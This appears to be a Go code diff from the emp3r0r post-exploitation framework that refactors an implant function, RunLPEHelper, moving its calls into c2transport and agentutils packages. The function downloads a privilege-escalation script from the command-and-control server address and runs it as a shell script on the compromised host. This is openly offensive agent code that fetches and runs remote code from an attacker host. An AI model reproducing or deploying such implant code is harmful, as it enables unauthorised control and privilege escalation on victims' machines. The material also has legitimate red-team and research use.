@@ -9,6 +9,8 @@ import (
 	"os"
 	"strings"
 
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/agentutils"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -37,18 +39,18 @@ func CopySelfTo(dest_file string) (err error) {
 	return os.WriteFile(dest_file, elf_data, 0o755)
 }
 
-// runLPEHelper runs helper scripts to give you hints on how to escalate privilege
-func runLPEHelper(method, checksum string) (out string) {
+// RunLPEHelper runs helper scripts to give you hints on how to escalate privilege
+func RunLPEHelper(method, checksum string) (out string) {
 	log.Printf("Downloading LPE script from %s", def.CCAddress+method)
 	var scriptData []byte
-	scriptData, err := SmartDownload("", method, "", checksum)
+	scriptData, err := c2transport.SmartDownload("", method, "", checksum)
 	if err != nil {
 		return "Download error: " + err.Error()
 	}
 
 	// run the script
 	log.Printf("Running LPE helper %s", method)
-	out, err = RunShellScript(scriptData, os.Environ())
+	out, err = agentutils.RunShellScript(scriptData, os.Environ())
 	if err != nil {
 		return fmt.Sprintf("Run LPE helper %s failed: %s %v", method, out, err)
 	}
